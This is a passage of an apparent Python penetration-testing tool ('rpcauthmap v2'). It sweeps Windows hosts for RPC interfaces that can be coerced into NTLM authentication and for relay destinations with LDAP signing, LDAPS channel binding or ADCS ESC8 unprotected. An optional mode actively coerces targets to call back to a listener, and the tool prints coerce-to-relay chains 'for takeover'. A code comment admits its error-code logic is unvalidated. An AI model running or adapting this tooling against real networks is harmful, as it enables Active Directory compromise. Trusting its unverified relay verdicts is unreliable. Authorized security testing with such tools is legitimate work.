                ldap_viable.append('ADCS ESC8')
                lines.append('     ADCS web enrollment: %s'
                             % c('NTLM-accepting (ESC8 candidate)', C.BRED))
                for u in esc8:
                    lines.append(c('        %s' % u, C.GREY))
                lines.append(c('        -> relay here for a cert as the victim, '
                               'then PKINIT or PassTheCert', C.CYAN))
            else:
                lines.append('     ADCS web enrollment: %s'
                             % c('none found (no NTLM /certsrv endpoint)',
                                 C.GREEN))

        # == CONCLUSION ==
        lines.append(c('  == CONCLUSION ==', C.BOLD + C.CYAN))
        if coercibles:
            cnames = ', '.join(e['label'] for e in coercibles)
            lines.append(c('     coercible via: %s' % cnames, C.YELLOW))
            lines.append(c('       reason: exposes an RPC method that reaches out '
                           'to a UNC you supply', C.GREY))
        else:
            lines.append(c('     coercible: none found on this host', C.GREY))
        if relay_viables:
            tcpn = sum(1 for r in relay_viables if not r['is_pipe'])
            lines.append(c('     relay target: %d endpoint(s), %d over direct TCP'
                           % (len(relay_viables), tcpn), C.BRED))
            lines.append(c('       reason: these accept an unsigned bind and TCP '
                           'has no SMB signing in the path', C.GREY))
        elif smb_signing is True:
            lines.append(c('     relay target: none; SMB signing closes the pipe '
                           'relays (coerce this host, relay ELSEWHERE instead)',
                           C.GREY))
        else:
            lines.append(c('     relay target: none viable', C.GREY))
        if self.relay_checks:
            if ldap_viable:
                lines.append(c('     cross-protocol: %s relay-viable here'
                               % ', '.join(ldap_viable), C.BRED))
                if coercibles:
                    lines.append(c('       full chain: coerce this host, relay '
                                   'to %s for takeover' % ldap_viable[0], C.GREY))
            else:
                lines.append(c('     cross-protocol: no LDAP/LDAPS/ADCS relay '
                               'path open here', C.GREY))

        if self.show_all and detail_rows:
            lines.append(c('  == ALL INTERFACES (%d) ==' % len(detail_rows),
                           C.GREY))
            for blk in detail_rows:
                lines.extend(blk)

        result = {
            'host': host,
            'coercibles': coercibles,
            'rpc_relay': relay_viables,
            'smb_signing': smb_signing,
            'ldap': ls, 'ldaps': cb, 'esc8': esc8,
        }
        return host, (relay_count + coerce_count, coerce_count, lines,
                      'scanned', result)


# --------------------------------------------------------------------------- #
# Cross-protocol relay-destination checks (LDAP signing, LDAPS channel binding,
# ADCS ESC8 web enrollment). These answer: if I coerce a machine account, where
# can I actually relay it?
#
# Technique (after zyn3rgy/LdapRelayScan): bind with BOGUS credentials and read
# the error. If the server rejects on the credentials (data 52e / invalid), the
# protection did NOT stop us, so relaying a real auth would work. If it rejects
# earlier with a signing/channel-binding error, the protection is enforced.
#
# NOTE: the exact error-code interpretation is the fiddly part and could not be
# validated here against a real DC. Verify on a live domain before trusting it.
# --------------------------------------------------------------------------- #
def _port_open(host, port, timeout):
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.close()
        return True
    except Exception:
        return False


def check_ldap_signing(host, timeout):
    """LDAP signing on 389. 'not required' == relay-viable."""
    if not _port_open(host, 389, timeout):
        return 'closed'
    if not _HAVE_LDAP3:
        return 'unknown (pip install ldap3)'
    try:
        server = Server(host, port=389, use_ssl=False, connect_timeout=timeout)
        conn = Connection(server, user='WORKGROUP\\nonexistent',
                          password='x', authentication=NTLM)
        conn.open()
        conn.bind()
        msg = '%s %s' % (conn.result.get('description', ''),
                         conn.result.get('message', ''))
        low = msg.lower()
        if '52e' in low or 'invalidcredentials' in low:
            return 'NOT required (relay-viable)'
        if 'strongerauth' in low or '8341' in low or '80090346' in low:
            return 'required'
        return 'unknown (%s)' % msg.strip()[:50]
    except Exception as e:
        return 'unknown (%r)' % e


def check_ldaps_channel_binding(host, timeout):
    """LDAPS channel binding (EPA) on 636. 'not required' == relay-viable."""
    if not _port_open(host, 636, timeout):
        return 'closed'
    if not _HAVE_LDAP3:
        return 'unknown (pip install ldap3)'
    try:
        tls = Tls(validate=ssl.CERT_NONE)
        server = Server(host, port=636, use_ssl=True, tls=tls,
                        connect_timeout=timeout)
        conn = Connection(server, user='WORKGROUP\\nonexistent',
                          password='x', authentication=NTLM)
        conn.open()
        conn.bind()
        msg = '%s %s' % (conn.result.get('description', ''),
                         conn.result.get('message', ''))
        low = msg.lower()
        if '80090346' in low:  # SEC_E_BAD_BINDINGS -> channel binding enforced
            return 'required'
        if '52e' in low or 'invalidcredentials' in low:
            return 'NOT required (relay-viable)'
        return 'unknown (%s)' % msg.strip()[:50]
    except Exception as e:
        return 'unknown (%r)' % e


def check_esc8(host, timeout):
    """Return web-enrollment URLs that answer with NTLM/Negotiate (ESC8)."""
    found = []
    probes = [('http', 80, '/certsrv/certfnsh.asp'),
              ('http', 80, '/certsrv/'),
              ('https', 443, '/certsrv/')]
    for scheme, port, path in probes:
        if not _port_open(host, port, timeout):
            continue
        try:
            if scheme == 'https':
                ctx = ssl._create_unverified_context()
                conn = http.client.HTTPSConnection(host, port, timeout=timeout,
                                                    context=ctx)
            else:
                conn = http.client.HTTPConnection(host, port, timeout=timeout)
            conn.request('GET', path)
            r = conn.getresponse()
            auth = (r.getheader('WWW-Authenticate') or '')
            conn.close()
            if r.status == 401 and ('NTLM' in auth or 'Negotiate' in auth):
                found.append('%s://%s%s' % (scheme, host, path))
        except Exception:
            continue
    return found


# --------------------------------------------------------------------------- #
# helpers
# --------------------------------------------------------------------------- #
def _rand_tag():
    return 'x%d' % (int(time.time() * 1000) % 100000)


def render_engagement_summary(results):
    """Build the final colored wrap-up: coercible sources, relay destinations,
    and the coerce->relay chains between them."""
    sources = []   # (ip, labels, confirmed_bool)
    dests = []     # (ip, [type tags])
    for r in results:
        if r.get('coercibles'):
            labels = ', '.join(e['label'] for e in r['coercibles'])
            conf = any(e.get('confirmed') for e in r['coercibles'])
            sources.append((r['host'], labels, conf))

        tags = []
        if r.get('ldap') and 'NOT required' in (r['ldap'] or ''):
            tags.append('LDAP')
        if r.get('ldaps') and 'NOT required' in (r['ldaps'] or ''):
            tags.append('LDAPS')
        if r.get('esc8'):
            tags.append('ADCS-ESC8')
        if r.get('rpc_relay'):
            tags.append('SMB/RPC')
        if tags:
            dests.append((r['host'], tags))

    if not sources and not dests:
        return ''

    out = []
    out.append(c('=' * 60, C.BOLD + C.CYAN))
    out.append(c('  ENGAGEMENT SUMMARY', C.BOLD + C.CYAN))
    out.append(c('=' * 60, C.BOLD + C.CYAN))

    # --- coercible sources ---
    out.append(c('  COERCIBLE SOURCES (make these authenticate to you):',
                 C.BOLD))
    if sources:
        wip = max(len(s[0]) for s in sources)
        for ip, labels, conf in sources:
            verdict = (c('CONFIRMED', C.BOLD + C.GREEN) if conf
                       else c('candidate', C.YELLOW))
            out.append('    %s  %s  %s'
                       % (c(ip.ljust(wip), C.BRED), verdict,
                          c(labels, C.GREY)))
    else:
        out.append(c('    none', C.GREY))

    # --- relay destinations ---
    out.append(c('  RELAY DESTINATIONS (accept a relayed NTLM auth):', C.BOLD))
    grant = {'LDAP': 'RBCD/shadow-creds', 'LDAPS': 'RBCD/shadow-creds',
             'ADCS-ESC8': 'cert then PKINIT/PassTheCert',
             'SMB/RPC': 'needs a privileged user, not a machine acct'}
    if dests:
        wip = max(len(d[0]) for d in dests)
        for ip, tags in dests:
            gtxt = '; '.join('%s=%s' % (t, grant[t]) for t in tags)
            out.append('    %s  %s'
                       % (c(ip.ljust(wip), C.BRED),
                          c(' '.join(tags), C.BOLD) + c('  (%s)' % gtxt,
                                                        C.GREY)))
    else:
        out.append(c('    none found', C.GREY))

    # --- chains ---
    out.append(c('  CHAINS (coerce -> relay):', C.BOLD))
    ldap_dests = [(ip, tags) for ip, tags in dests
                  if any(t in ('LDAP', 'LDAPS', 'ADCS-ESC8') for t in tags)]
    if sources and ldap_dests:
        for ip, labels, conf in sources:
            tgts = ', '.join('%s[%s]' % (dip, '/'.join(
                t for t in tags if t in ('LDAP', 'LDAPS', 'ADCS-ESC8')))
                for dip, tags in ldap_dests)
            out.append('    %s %s %s'
                       % (c(ip, C.BRED), c('->', C.GREY),
                          c('relay to: ' + tgts, C.BOLD)))
    elif sources and not ldap_dests:
        out.append(c('    coercible sources found, but no LDAP/LDAPS/ADCS relay '
                     'destination (run with --relay-checks against the DC/CA)',
                     C.GREY))
    else:
        out.append(c('    no complete coerce->relay chain found', C.GREY))

    smb_dests = [ip for ip, tags in dests if 'SMB/RPC' in tags]
    if smb_dests:
        out.append(c('    SMB/RPC relay targets (for a privileged USER auth, '
                     'e.g. a poisoned/coerced admin, NOT a machine account): %s'
                     % ', '.join(smb_dests), C.GREY))

    out.append(c('=' * 60, C.BOLD + C.CYAN))
    return '\n'.join(out)


def parse_creds(prefix):
    domain = ''
    username = prefix
    password = ''
    if '/' in prefix:
        domain, username = prefix.split('/', 1)
    if ':' in username:
        username, password = username.split(':', 1)
    return domain, username, password


def expand_targets(spec):
    targets = []
    if spec.startswith('@'):
        try:
            with open(spec[1:]) as fh:
                for ln in fh:
                    ln = ln.strip()
                    if ln and not ln.startswith('#'):
                        targets.append(ln)
        except Exception as e:
            sys.stderr.write('[-] Could not read target file: %s\n' % e)
        return targets
    for part in spec.split(','):
        part = part.strip()
        if not part:
            continue
        if '/' in part:
            try:
                net = ipaddress.ip_network(part, strict=False)
                targets.extend(str(ip) for ip in net.hosts())
                continue
            except ValueError:
                pass
        targets.append(part)
    return targets


def main():
    global _NOCOLOR
    parser = argparse.ArgumentParser(
        add_help=True,
        description='RPC discovery + capability classification + coercion probe')
    parser.add_argument('target',
                        help="[[domain/]user[:pass]@]<host|CIDR|list|@file>")
    parser.add_argument('-hashes', action='store', metavar='LM:NT',
                        help='NTLM hashes for auth')
    parser.add_argument('-threads', type=int, default=10,
                        help='concurrent hosts (default 10)')
    parser.add_argument('-timeout', type=int, default=3,
                        help='per-connect timeout seconds (default 3)')
    parser.add_argument('--no-pipes', action='store_true',
                        help='skip SMB named-pipe discovery')
    parser.add_argument('--brute', action='store_true',
                        help='brute-bind known UUIDs when ifids is refused')
    parser.add_argument('--coerce', action='store_true',
                        help='ACTIVELY test coercible interfaces (fires auth at '
                             'the listener). Authorized use only.')
    parser.add_argument('--relay-checks', action='store_true',
                        help='also probe LDAP signing, LDAPS channel binding and '
                             'ADCS ESC8 web enrollment on each host (needs ldap3)')
    parser.add_argument('--listener-ip', action='store',
                        help='IP the target should call back to (required with '
                             '--coerce)')
    parser.add_argument('--listener-port', type=int, default=445,
                        help='local callback listener port (default 445)')
    parser.add_argument('--coerce-timeout', type=int, default=5,
                        help='seconds to wait for a callback (default 5)')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='also print dead/no-RPC hosts')
    parser.add_argument('--show-all', action='store_true',
                        help='print every interface, not just hits')
    parser.add_argument('--no-color', action='store_true', help='disable colour')
    parser.add_argument('-o', '--output', action='store',
                        help='append plain-text (no colour) results to file')
    options = parser.parse_args()

    _NOCOLOR = options.no_color or not sys.stdout.isatty()

    # Hard ceiling on any single socket op so a half-open RPC port cannot hang
    # the sweep. The listener sets its own shorter timeout explicitly.
    socket.setdefaulttimeout(max(5, options.timeout + 2))

    # creds + target
    spec = options.target
    domain = username = password = ''
    if '@' in options.target:
        prefix, spec = options.target.rsplit('@', 1)
        domain, username, password = parse_creds(prefix)
    if password == '' and username != '' and options.hashes is None:
        from getpass import getpass
        password = getpass('Password:')

    if options.coerce and not options.listener_ip:
        sys.stderr.write('[-] --coerce requires --listener-ip (the address the '
                         'target routes back to).\n')
        sys.exit(1)

    targets = expand_targets(spec)
    if not targets:
        sys.stderr.write('[-] No valid targets parsed.\n')
        sys.exit(1)

    listener = None
    if options.coerce:
        listener = CallbackListener('0.0.0.0', options.listener_port)
        try:
            listener.start()
        except Exception as e:
            sys.stderr.write('[-] Could not bind listener on port %d: %s\n'
                             '    (is smbd using 445? stop it or pick another '
                             'port the target can reach)\n'
                             % (options.listener_port, e))
            sys.exit(1)
        print(c('[*] Callback listener on 0.0.0.0:%d, expecting call-backs to %s'
                % (options.listener_port, options.listener_ip), C.CYAN))

    outfh = None
    if options.output:
        try:
            outfh = open(options.output, 'a')
            outfh.write('\n# rpcauthmap v2 sweep of %d target(s)\n' % len(targets))
        except Exception as e:
            sys.stderr.write('[-] Could not open output file: %s\n' % e)
            outfh = None

    print(c('[*] Sweeping %d host(s) with %d thread(s)...'
            % (len(targets), options.threads), C.CYAN))
    print('')

    def worker(host):
        mapper = RPCAuthMap(
            username=username, password=password, domain=domain,
            hashes=options.hashes, timeout=options.timeout,
            show_all=options.show_all, probe_pipes=not options.no_pipes,
            do_brute=options.brute, do_coerce=options.coerce,
            listener=listener, listener_ip=options.listener_ip,
            coerce_timeout=options.coerce_timeout, debug=options.verbose,
            relay_checks=options.relay_checks,
        )
        return mapper.scan(host)

    total_hits = total_coerce = hosts_scanned = hosts_quiet = 0
    results = []
    with ThreadPoolExecutor(max_workers=max(1, options.threads)) as pool:
        futures = [pool.submit(worker, h) for h in targets]
        for fut in as_completed(futures):
            host, payload = fut.result()
            hit_count, coerce_count, lines, status, result = payload
            results.append(result)
            if status == 'scanned':
                hosts_scanned += 1
                total_hits += hit_count
                total_coerce += coerce_count
            else:
                hosts_quiet += 1
            if status == 'scanned' or options.verbose:
                block = '\n'.join(lines)
                with _print_lock:
                    print(block)
                    print('')
                    if outfh:
                        outfh.write(strip_ansi(block) + '\n\n')
                        outfh.flush()

    if listener:
        listener.stop()

    s1 = ('[*] Sweep complete: %d target(s) probed; %d live RPC host(s), '
          '%d unreachable/no-RPC.' % (len(targets), hosts_scanned, hosts_quiet))
    s2 = ('[*] %d relay-viable/coercible endpoint(s); %d coercion(s) CONFIRMED '
          'via callback.' % (total_hits, total_coerce))
    print(c(s1, C.CYAN))
    print(c(s2, C.BOLD))

    summary = render_engagement_summary(results)
    if summary:
        print('')
        print(summary)

    if outfh:
        outfh.write(strip_ansi(s1) + '\n' + strip_ansi(s2) + '\n')
        if summary:
            outfh.write('\n' + strip_ansi(summary) + '\n')
        outfh.close()
        print(c('[*] Plain-text results appended to %s' % options.output, C.CYAN))


if __name__ == '__main__':
    main()
